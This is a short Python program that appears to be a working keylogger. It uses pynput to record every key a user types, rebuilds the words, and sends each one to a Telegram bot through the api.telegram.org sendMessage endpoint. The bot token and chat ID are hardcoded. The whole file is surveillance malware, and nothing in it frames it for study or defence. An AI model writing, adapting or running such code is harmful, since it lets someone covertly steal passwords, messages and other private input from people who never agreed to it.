import requests
from pynput import keyboard

TOKEN = "8543293257:AAE6cE2syuPHrjzuJPsAF53V67hEPpCKEJk"
CHAT_ID = "5697467097"

real_word = ""

def send_telegram_message(message):
    if not message.strip():
        return
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
        response = requests.get(url)
        response.raise_for_status()
        print(f"Message sent: {message}")
    except Exception as e:
        print(f"Error sending message: {e}")

def on_press(key):
    global real_word

    try:
        real_word += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            # When space is pressed, send current word and reset
            send_telegram_message(real_word)
            real_word = ""
        elif key == keyboard.Key.enter:
            # When enter is pressed, send current word and reset
            send_telegram_message(real_word)
            real_word = ""
        elif key == keyboard.Key.backspace:
            # Handle backspace
            real_word = real_word[:-1]
        else:
            print(f"Special key: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Final message send on escape (if any) and exit
        if real_word:
            send_telegram_message(real_word)
        return False

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release
) as listener:
    listener.join()